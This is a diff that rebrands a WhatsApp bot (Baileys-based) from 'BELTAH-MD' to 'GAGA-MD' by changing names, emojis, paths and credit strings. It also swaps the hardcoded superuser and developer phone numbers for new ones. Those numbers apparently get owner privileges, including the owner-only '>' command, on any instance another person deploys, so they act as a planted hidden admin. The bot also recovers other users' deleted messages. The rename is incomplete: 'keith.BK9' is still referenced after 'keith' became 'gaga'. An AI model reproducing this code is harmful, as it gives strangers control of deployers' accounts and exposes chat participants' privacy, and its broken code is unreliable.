@@ -76,7 +76,7 @@ const {
   atbverifierEtatJid,
   atbrecupererActionJid
 } = require("./bdd/antibot");
-let evt = require(__dirname + "/keizzah/keith");
+let evt = require(__dirname + "/midushgaga/gaga");
 const {
   isUserBanned,
   addUserToBanList,
@@ -92,11 +92,11 @@ const {
   addGroupToOnlyAdminList,
   removeGroupFromOnlyAdminList
 } = require("./bdd/onlyAdmin");
-//const //{loadCmd}=require("/keizzah/mesfonctions")
+//const //{loadCmd}=require("/midushgaga/mesfonctions")
 let {
   reagir
-} = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/BELTAH-MD;;;=>/g, "");
+} = require(__dirname + "/midushgaga/app");
+var session = conf.session.replace(/GAGA-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE || [];
 
 require('dotenv').config({
@@ -143,7 +143,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['BELTAH-MD', "safari", "1.0.0"],
+      browser: ['GAGA-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -275,7 +275,7 @@ if (conf.AUTOBIO === 'yes') {
     setInterval(() => {
       const date = new Date();
       zk.updateProfileStatus(
-        `👻 ${conf.BOT} 👻 || 𝐃𝐚𝐭𝐞: ${date.toLocaleString('en-US' , { timeZone: 'Africa/Nairobi' })} || 𝐃𝐚𝐲: ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
+        `🥷 ${conf.BOT} 🥷 || 𝐃𝐚𝐭𝐞: ${date.toLocaleString('en-US' , { timeZone: 'Africa/Nairobi' })} || 𝐃𝐚𝐲: ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
       );
     }, 10 * 1000);
   }
@@ -326,9 +326,9 @@ zk.ev.on("messages.upsert", async (m) => {
     // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  return `*『 👻 ${conf.BOT} ᴀɴᴛɪᴅᴇʟᴇᴛᴇ 👻 』*\n\n` +
+  return `*『 𝚾𝐆𝚫𝐆𝚫 𝚩𝚯𝚻𝐒 𝚫𝚴𝚻𝚰𝐃𝚵𝐋𝚵𝚻𝚵 』*\n\n` +
     `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ:* ${new Date().toLocaleString()}\n` +
-    `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* @${deletedBy.split('@')[0]}\n\n> ᴅᴇʟᴇᴛᴇᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ʙᴇʟᴛᴀʜ-ᴍᴅ`;
+    `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* @${deletedBy.split('@')[0]}\n\n> keep using xgaga bots`;
 }
 // Helper function to download media based on message type
 async function downloadMessageMedia(message) {
@@ -439,10 +439,10 @@ zk.ev.on("messages.upsert", async m => {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254737681758", '254114141192',"254738625827","254759328581", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254112291443", '254729269118',"254757232472","", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192',"254737681758","254759328581",'254738625827'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254112291443',"254729269118","254757232472",'254729269118'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -450,7 +450,7 @@ zk.ev.on("messages.upsert", async m => {
           quoted: ms
         });
       }
-      console.log("\t [][]...{Beltah-Md}...[][]");
+      console.log("\t [][]...{Xgaga-Md}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -542,7 +542,7 @@ zk.ev.on("messages.upsert", async m => {
           }
         });
       }
-//BELTAH MD DID EVERYTHING ,,,DO NOT COPY ...
+//DID EVERYTHING ,,,DO NOT COPY ...
 if (!superUser && origineMessage  === auteurMessage && conf.AUTO_REACT === "yes") {
 const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '🛰️', '🥔', '🎡', '🎸', '🎼', '🔉', '📿', '🪇', '📹', '🎞️', '🪔', '📔', '🏷️', '💰', '📥', '🗳️', '📭', '🖌️', '📏', '', '🪛', '🔨', '⛓️‍💥', '📌', '🗝️', '🔍', '🥁', '🔊', '🥾', '👢', '🩰', '👡', '🙂', '🎊', '🎉', '🎁', '⛑️', '👋']
          const beltahs = emojis[Math.floor(Math.random() * (emojis.length))]
@@ -568,9 +568,9 @@ const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '�
       }
     });
 
-    const keith = response.data;
+    const gaga = response.data;
 
-    if (keith && keith.status && keith.BK9) {
+    if (gaga && gaga.status && gaga.BK9) {
       await zk.sendMessage(origineMessage, {
         text: keith.BK9
       });
@@ -597,11 +597,11 @@ const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '�
       }
     });
 
-    const keith = response.data;
+    const gaga = response.data;
 
-    if (keith && keith.success && keith.message) {
+    if (gaga && gaga.success && gaga.message) {
       // Generate audio URL for the response message
-      const audioUrl = googleTTS.getAudioUrl(keith.message, {
+      const audioUrl = googleTTS.getAudioUrl(gaga.message, {
         lang: 'en', // You can modify this to support any language dynamically
         slow: false,
         host: 'https://translate.google.com'
@@ -640,13 +640,13 @@ const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '�
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
   if (!superUser) {
-    const menuText = `This command is only for the owner or Beltah to execute 🚫`;
+    const menuText = `This command is only for the owner or Gaga to execute 🚫`;
 
     await zk.sendMessage(origineMessage, {
       text: menuText,
       contextInfo: {
         externalAdReply: {
-          title: "𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃" ,
+          title: "Xgaga bots" ,
           body: "POWERED BY BELTAH HACKING TEAM",
           sourceUrl: "https://whatsapp.com/channel/0029VaRHDBKKmCPKp9B2uH2F" ,
           thumbnailUrl: "https://telegra.ph/file/dcce2ddee6cc7597c859a.jpg" || conf.BOT_MENU_LINK,
@@ -681,7 +681,7 @@ if (texte && texte.startsWith('>')) {
   
   await zk.sendMessage(user, { 
     text: text,
-    react: { text: '👻', key: ms.key }
+    react: { text: '🥷', key: ms.key }
   }, { quoted: ms });
                        }
 
@@ -811,7 +811,7 @@ if (texte && texte.startsWith('>')) {
                                     };
                                     var txt = "link detected, \n";
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
-                                    const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
+                                    const gifLink = "https://raw.githubusercontent.com/Rich-Gaga-Midush/GAGA/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
                                         pack: '',
                                         author: conf.OWNER_NAME,
@@ -911,7 +911,7 @@ if (texte && texte.startsWith('>')) {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'BELTAH-MD',
+                pack: 'GAGA-MD',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1188,12 +1188,12 @@ if (texte && texte.startsWith('>')) {
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Beltah MD bot is online 🕸\n\n");
+                console.log("Gaga MD bot is online 🕸\n\n");
                 console.log("Loading commands...\n");
-                fs.readdirSync(__dirname + "/commands").forEach((fichier) => {
+                fs.readdirSync(__dirname + "/plugins").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
-                            require(__dirname + "/commands/" + fichier);
+                            require(__dirname + "/plugins/" + fichier);
                             console.log(fichier + " installed ✔️");
                         }
                         catch (e) {
@@ -1220,7 +1220,7 @@ if (texte && texte.startsWith('>')) {
                     
                        Use command [  ${prefixe} Sync ] to fetch the latest commands of  ${conf.BOT}. 
                     
-                    > Powered by Beltah Tech Team`;
+                    > keep using xgaga bots`;
                     await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
             }
